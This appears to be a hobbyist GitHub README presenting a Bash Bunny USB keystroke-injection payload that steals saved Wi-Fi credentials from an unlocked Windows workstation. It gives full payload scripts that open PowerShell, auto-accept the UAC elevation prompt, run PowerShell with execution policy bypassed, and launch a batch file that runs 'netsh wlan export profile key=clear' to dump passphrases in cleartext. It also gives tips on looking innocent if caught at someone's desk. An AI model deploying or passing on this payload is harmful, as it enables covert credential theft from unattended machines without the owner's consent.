# BashBunny-Script-6
In this I am creating a Bash Bunny Script to hack the credentials from a locked machine
In this script I wanted to try and hack the wireless credentials form a locked machine through bash bunny

I took the reference from the below link

https://blog.didierstevens.com/2017/04/06/quickpost-using-my-bash-bunny-to-snag-creds-from-a-locked-machine/

 Basically, what this module does is force an administrator command prompt to run and then issue the following command
 
 netsh wlan export profile key=clear
  
 Since the machine has to be unlocked anyway, you might be wondering why not just open a command prompt and run the above command manually? Why bother with the Bash Bunny? Here is why: When you are doing a physical penetration test or red team engagement you will often find unlocked workstations. If you are going to collect data from such a workstation it is much easier to be stealthy if all you have to do is plug-in a USB. You would not necessarily even need to sit down at the computer. Let’s face it, typing on someone else’s keyboard is definitely a red flag if someone were to notice you but standing near someone’s desk (while you wait about 7 seconds for the Bash Bunny to do its job) can be much easier “explained” if you get caught.
 
Here is how to prep and launch the attack:

First, put the bunny in arming mode (switch position 3, toward the insertion point) and grab the payload files


I tried with the script below 


# Source bunny_helpers.sh to get the environment

source bunny_helpers.sh

# Set language accordingly ( Here I have set it to US English)

Q SET_LANGUAGE US

ATTACKMODE HID STORAGE

LED B 200

# Launch Powershell As Admin

Q GUI r

Q DELAY 100

Q STRING powershell Start-Process powershell // This will start the powershell

Q ENTER

# Bypass UAC

Q DELAY 3000

Q ALT y     // Q ALT y” command means to enter the letter “y” when the UAC prompt is presented 

Q ENTER    // This is for the the UAC elevation permission

Q DELAY 500


To launch the attack move the switch to the switch position where you stored the payloads, in Switch 1 or Switch 2

Then, Plug it into the Unlocked Machine.

Each of these files contains the SSID and where possible (WEP/WPA-PSK &WPA2-PSK), the passphrase:

Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext.

So I modified the payload.txt file like this…



###### Now using this Bashbunny script to capture the wireless credentials  #######

# #Set language accordingly

Q SET_LANGUAGE US

ATTACKMODE HID STORAGE

LED B 200

# #Launch Powershell

Q GUI r

# Commented this lines

#Launch Powershell As Admin

#Q GUI r

#Q DELAY 100

#Q STRING powershell Start-Process powershell -Verb runAs 

#Q ENTER

# Bypass UAC

#Q DELAY 3000

#Q ALT y

#Q ENTER

#Q DELAY 500

# Added this lines Below

Q DELAY 1000

Q STRING powershell -exec bypass 

Q ENTER

Q DELAY 3000


# 	Start a.cmd

Q STRING '.((gwmi win32_volume -f '"''"'label='"''"'BashBunny'"''"').Name+'"''"'payloads/'

Q STRING $SWITCH_POSITION

Q STRING 'a.cmd'"''"')'

Q ENTER

# Wait for the a.cmd to finish and exit
